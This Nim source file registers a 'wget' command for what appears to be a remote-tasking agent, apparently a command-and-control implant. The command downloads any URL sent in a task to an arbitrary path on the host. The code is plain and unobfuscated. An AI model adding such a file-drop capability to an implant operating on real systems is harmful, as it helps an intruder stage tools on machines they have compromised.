import std/[httpclient, json, os, strutils, net]
import core/types
import commands/registry

proc wgetExecute(taskId: string, params: JsonNode, state: AgentState,
                 send: SendMsg): TaskResult =
  let url = params{"url"}.getStr("")
  if url.len == 0:
    return TaskResult(output: "Error: url is required", status: "error", completed: true)

  var dest = params{"output"}.getStr("")
  if dest.len == 0:
    # Extract filename from URL, strip query string
    var name = url.split('/')[^1]
    let qIdx = name.find('?')
    if qIdx >= 0: name = name[0 ..< qIdx]
    dest = if name.len > 0: name else: "downloaded_file"

  let fullPath = if isAbsolute(dest): dest else: state.cwd / dest

  try:
    let client = newHttpClient(timeout = 60000)
    defer: client.close()
    client.downloadFile(url, fullPath)
    let size = getFileSize(fullPath)
    return TaskResult(
      output:    "Saved " & url & " -> " & fullPath & " (" & $size & " bytes)",
      status:    "success",
      completed: true)
  except Exception as e:
    return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)

proc initWget*() =
  register("wget", wgetExecute)
